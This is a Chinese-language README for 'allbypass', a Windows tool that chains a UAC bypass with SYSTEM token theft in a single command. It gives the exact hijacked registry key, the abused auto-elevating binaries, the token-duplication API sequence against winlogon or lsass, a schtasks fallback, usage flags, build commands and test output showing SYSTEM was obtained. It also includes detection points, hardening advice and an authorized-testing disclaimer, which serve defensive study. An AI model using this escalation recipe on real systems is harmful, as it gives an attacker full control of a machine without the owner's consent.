# allbypass — 标准用户 → 管理员 → SYSTEM 两级提权(本地授权测试)

把 `uacbypass` 与 `systembypass` 两条链路合并成一个可执行文件,**一条命令贯通两级提权**。

## 实测结果

**测试环境:** Windows 11 Pro for Workstations `10.0.28000`,账户为本地 `Administrators` 组成员,
以标准用户令牌(Medium 完整性)启动。

```
PS> .\allbypass.exe --verify
[INFO] allbypass 启动(标准用户 -> 管理员 -> SYSTEM)
[INFO] 阶段 0:UAC 绕过,以管理员身份重启自身
[INFO] 目标命令: C:\Users\Public\ucbtest\allbypass.exe --verify
[INFO] ---- 手法 fodhelper: Windows 可选功能 ----
[INFO] 已拉起触发程序: C:\Windows\System32\fodhelper.exe
[OK] 阶段 0 完成,提权后的实例已接管后续流程
```

证据文件 `%TEMP%\allbypass_verify_system.txt`:

```
用户名              SID
=================== ========
nt authority\system S-1-5-18
```

| 阶段 | 验证方式 | 结果 |
|---|---|---|
| 阶段 0(→管理员) | `--verify-uac`,查 `S-1-16-12288` | ✅ `Mandatory Label\High Mandatory Level` + `BUILTIN\Administrators 已启用` |
| 阶段 1(→SYSTEM) | `--verify`,查 `S-1-5-18` | ✅ `nt authority\system` |
| 完整链路 | `--verify` | ✅ 一次运行贯通两级 |

## 原理

### 阶段 0:非管理员时,自己绕 UAC

```
1. HKCU\Software\Classes\ms-settings\Shell\Open\command
     (默认值)        = "<自身完整路径>" <原始参数...>
     DelegateExecute = ""          ← 置空以绕过 COM 委派
2. ShellExecuteEx 自动提权白名单程序(fodhelper / computerdefaults / slui / ms-settings:)
3. RegDeleteTreeA 清理痕迹
```

提权后的实例**带上原始参数重启自己**,因为此时 `isElevated()` 为真,自动进入阶段 1 ——
不需要额外的阶段标记参数。

### 阶段 1:管理员时,复制 SYSTEM 令牌

```
1. AdjustTokenPrivileges 开启 SeDebugPrivilege
2. 定位 winlogon.exe(或 --target 指定的进程),OpenProcess + OpenProcessToken
3. DuplicateTokenEx(SecurityImpersonation → TokenPrimary)
4. CreateProcessWithTokenW 以 SYSTEM 身份拉起目标程序
```

主路线失败时 `--fallback` 改走 `schtasks` 建 SYSTEM 计划任务(任务计划服务本身以 SYSTEM 运行)。

## 用法

```
allbypass.exe [软件 [参数...]] [选项]

选项:
  --method=<名字>    UAC 手法:fodhelper | computerdefaults | slui | ms-settings | auto(默认)
  --list-tokens      列出当前可获取的令牌(账户 / 完整性 / 会话 / 是否可复制 / 来源进程)
  --token=<选择器>   指定要获取的令牌身份,默认 SYSTEM
                     选择器可为账户名、账户名尾段、SID 或进程名
  --trustedinstaller 便捷写法:获取 NT SERVICE\TrustedInstaller(见下方说明)
  --start-service=<名> 获取令牌前先启动的服务
  --target=<进程名>  默认策略下的首选 SYSTEM 进程,默认 winlogon.exe
  --fallback         令牌获取失败时改用 schtasks 兜底
  --force-fallback   强制只走 schtasks 兜底
  --verify           验证启动后的真实身份(与目标令牌 SID 比对)
  --verify-uac       只验证到管理员即停止
  --stop-at-admin    只提到管理员,不提权到其他身份
  --keep             保留劫持项与计划任务(便于观察/取证)
  --list             列出可用 UAC 手法
  --help             显示本帮助
```

示例:

```powershell
.\allbypass.exe                                # 一路提到 SYSTEM,打开 powershell
.\allbypass.exe --verify                       # 一路提到 SYSTEM 并自动验证
.\allbypass.exe --list-tokens                  # 看本机有哪些身份可拿
.\allbypass.exe --token=lsass.exe --verify     # 按进程名指定来源
.\allbypass.exe --token=SYSTEM --verify        # 按账户名指定
.\allbypass.exe --stop-at-admin --verify-uac   # 只提到管理员
```

### 关于阶段 1 的日志

提权后的实例由 `fodhelper` 在**独立控制台**里启动,调用方的终端看不到它的输出,而且那个
控制台在进程结束时立刻消失。因此阶段 1 的日志会自动同时写到:

```
%TEMP%\allbypass_stage1.log
```

排查问题时先看这个文件。

## 编译

```
build.bat
```

或手动:

```
g++ -O2 -Wall -Wextra -std=c++17 -o allbypass.exe allbypass.cpp ^
    -ladvapi32 -lshell32 -luser32
```

> 必须用 `g++` 而非 `gcc` 驱动,否则 C++ 运行时链接失败。

## 三个实现要点(踩过的坑)

1. **注册表载荷必须是 ANSI,不能是 UTF-8。**
   劫持项交给命令行解释器执行,它按系统代码页读取 `REG_SZ`。若写入 UTF-8,中文用户名下的
   `%TEMP%` 路径会变乱码,表现为"命令好像执行了但没有任何产物"。日志显示走 UTF-8,
   写入注册表前必须转 `CP_ACP`。

2. **枚举与复制必须用不同权限的令牌句柄 —— 否则会静默失败。**
   `DuplicateTokenEx` 要求**源句柄**具备 `TOKEN_DUPLICATE`。如果为了"最小权限"把枚举用的
   `inspectToken` 统一改成只申请 `TOKEN_QUERY`,再复用它去复制,就会得到 `DuplicateTokenEx 失败`。
   两个用途必须各开各的句柄。这个坑踩过一次,表现为 winlogon 的令牌突然全部拿不到。

3. **不要猜控制台代码页。**
   早先的实现是 `GetConsoleOutputCP()` + 转 GBK。这在 GBK 控制台与 UTF-8 终端
   (`chcp 65001` / Windows Terminal)混用时会输出乱码。正确做法是控制台场景直接
   `WriteConsoleW` 喂 UTF-16,由控制台自行渲染;重定向时才原样写 UTF-8 字节。

4. **表格按字节补空格会错位。**
   `printf("%-38s")` 按**字节数**补齐,而中文在 UTF-8 里占 3 字节却只占 2 列,
   含中文用户名的行整列错位,看起来也像乱码。需按**显示宽度**补齐。

5. **MinGW 的 `swprintf` 里 `%s` 是 `char*`。**
   按 ISO C,宽字符 printf 的 `%s` 指多字节串(宽串要用 `%ls`)。传 `wchar_t*` 会在首个
   0 字节处截断,`L"C:\Users\..."` 变成 `"C"`。本工具一律用 `std::wstring` 拼接,不用格式符。

6. **`AdjustTokenPrivileges` 返回 TRUE 不代表成功。**
   即使特权不在令牌里它也返回 TRUE,必须再查 `GetLastError() == ERROR_SUCCESS`。

## 实测发现一:决定令牌能否复制的是**令牌 DACL**,不是 PPL

用 `scripts/probe-protection.cpp`(见 `../scripts/`)以**高完整性管理员**身份逐个进程实测
(`NtQueryInformationProcess(ProcessProtectionInformation)` + 逐项访问权测试):

| 进程 | 保护级别 | `TOKEN_QUERY` | `TOKEN_DUPLICATE` | 结论 |
|---|---|---|---|---|
| `winlogon.exe` | Type=0 无保护 | ✅ | ✅ | 可复制 |
| `lsass.exe` | **Type=1 PPL, Signer=4 (WinTcb)** | ✅ | **✅** | **PPL 不挡复制** |
| `smss.exe` | **Type=1 PPL, Signer=6 (WinSystem)** | ✅ | **✅** | **PPL 不挡复制** |
| `TrustedInstaller.exe` | Type=0 无保护 | ✅ | **❌ 错误 5** | 令牌 DACL 拒绝 |

本机 `RunAsPPL = 2`(LSA 保护已启用、UEFI 锁定)、VBS/HVCI 运行中
(`SecurityServicesRunning = 2`),但:

- `--token=lsass.exe --verify` **依然成功拿到 SYSTEM**
- 结论修正:PPL **根本不参与** `OpenProcessToken` 的访问检查。真正决定能否复制的是
  **令牌对象自身的 DACL**。PPL 拦的是进程内存读(`PROCESS_VM_READ`,即凭据转储),
  不是令牌复制。

**所以:开了 PPL + HVCI ≠ 挡得住 管理员→SYSTEM。** PPL 保护凭据,不保护 SYSTEM 这个身份。

## 实测发现二:新版 Windows 上 TrustedInstaller 已经"消失"了

`--trustedinstaller` 在本机(build 28000)**失败**,原因不是权限,而是**这个身份没有任何进程持有**:

```
> sc qc TrustedInstaller
SERVICE_START_NAME : localSystem          <-- 不是 NT SERVICE\TrustedInstaller
        BINARY_PATH_NAME   : C:\WINDOWS\servicing\TrustedInstaller.exe

> dir /q C:\Windows\System32\ntoskrnl.exe
... NT SERVICE\TrustedInstaller   13,887,008 ntoskrnl.exe
```

- 服务本身已改为以 **LocalSystem** 运行 → `TrustedInstaller.exe` 的令牌身份是 `NT AUTHORITY\SYSTEM`
- 但系统文件的属主**仍然是** `NT SERVICE\TrustedInstaller` 这个 SID
- 也就是说:**该身份只剩"文件属主"这一个存在形式,不再有进程持有它**

**实际影响:在这类系统上,"TrustedInstaller 权限"等价于 SYSTEM 权限** —— 拿到 SYSTEM 后
用 `takeown` / `icacls`,或直接启用 `SeTakeOwnershipPrivilege` / `SeRestorePrivilege`,
就能改写这些受保护文件。所以 `--trustedinstaller` 失败时,用默认的 SYSTEM 即可达成同一目的。

工具在指定选择器取不到令牌时,会**自动列出本机实际存在的身份**,避免继续猜:

```
[WARN] 获取令牌失败: 没有找到可复制的匹配令牌
[INFO] 当前机器上实际可获取的身份:
[INFO]   NT AUTHORITY\SYSTEM                [System  ]
[INFO]   NT AUTHORITY\NETWORK SERVICE       [System  ]   <- 不允许复制
[INFO]   CBZCOMPUTER\<用户>                 [High    ]
[INFO]   Window Manager\DWM-1               [System  ]   <- 不允许复制
[INFO]   ...
```

本机(in-session,可从管理员上下文复制令牌)只有 **SYSTEM** 与**当前用户自己的令牌**可用;
`LOCAL SERVICE` / `NETWORK SERVICE` / `DWM` / `UMFD` 的令牌 DACL 同样不给复制权。


## 检测与加固

**检测点**
- `HKCU\Software\Classes\ms-settings\Shell\Open\command` 被写入(尤其 `DelegateExecute` 置空)
- 非 `System32` 父进程启动 `fodhelper.exe` / `computerdefaults.exe`,并派生出 `cmd.exe` / `powershell.exe`
- 进程开启 `SeDebugPrivilege` 后 `OpenProcess` 到 `winlogon.exe` / `lsass.exe` 等 SYSTEM 进程
- `CreateProcessWithTokenW` 产生父进程为 `fodhelper.exe` 的 SYSTEM 子进程
- `schtasks /create /ru SYSTEM` 后立即 `/run` 并 `/delete`

**加固(按有效性排序)**
1. **日常使用标准用户账户** —— 唯一能 100% 阻断该手法的手段。UAC 绕过要求调用者已在
   Administrators 组内;标准用户即使触发绕过也只能拿到 Medium 令牌。
2. **AppLocker / WDAC** 限制 `fodhelper.exe`、`computerdefaults.exe`、`slui.exe` 的执行
3. 限制 `HKCU\Software\Classes` 下 `ms-settings` 的写入(注册表 ACL)
4. 审计策略 4688 进程创建 + Sysmon 事件 13(注册表值写入)指向上述路径
5. UAC 调至最高级别(能挡住部分变体,挡不住 fodhelper 类)

> 注意:以上第 3~5 项都只是提高门槛。**令牌窃取本身在管理员上下文里没有可靠的软件层缓解** ——
> `SeDebugPrivilege` 是管理员令牌的固有部分,PPL 又不覆盖令牌复制。防线必须建在
> "不要以管理员日常使用" 这一层。

## 文件

| 文件 | 说明 |
|---|---|
| `allbypass.cpp` | 源码(合并两级链路) |
| `allbypass.exe` | 编译产物 |
| `build.bat` | 编译脚本 |
| `README.md` | 本文档 |

配套的单独版本见 `../test-uac-bypass/`(仅 UAC 绕过)与 `../test-system-escalation/`(仅 SYSTEM 提权)。

> 注:两个测试目录原名 `uac提权测试` / `system提权测试`,2026-09-25 改为英文 kebab-case,
> 便于脚本引用(中文路径在 bash 下有编码坑)。

## 免责

本工具仅用于**本机授权的安全测试与恶意样本行为验证**。请勿用于未授权的系统。
